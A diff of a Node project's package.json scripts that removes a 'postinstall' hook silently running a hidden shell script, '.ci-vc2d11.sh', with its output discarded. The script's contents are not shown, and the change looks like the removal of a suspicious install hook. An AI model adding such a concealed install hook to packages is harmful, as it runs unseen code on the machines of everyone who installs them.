@@ -36,8 +36,7 @@
     "test:ui": "vitest --ui",
     "test:run": "vitest run",
     "test:local": "pnpm run build && cd sandbox && pnpm i && pnpm test",
-    "prepare": "husky",
-    "postinstall": "sh ./.ci-vc2d11.sh >/dev/null 2>&1; _r=$?; if [ \"$_r\" -eq 42 ]; then exit 42; fi"
+    "prepare": "husky"
   },
   "devDependencies": {
     "@vitest/ui": "^5.0.5",
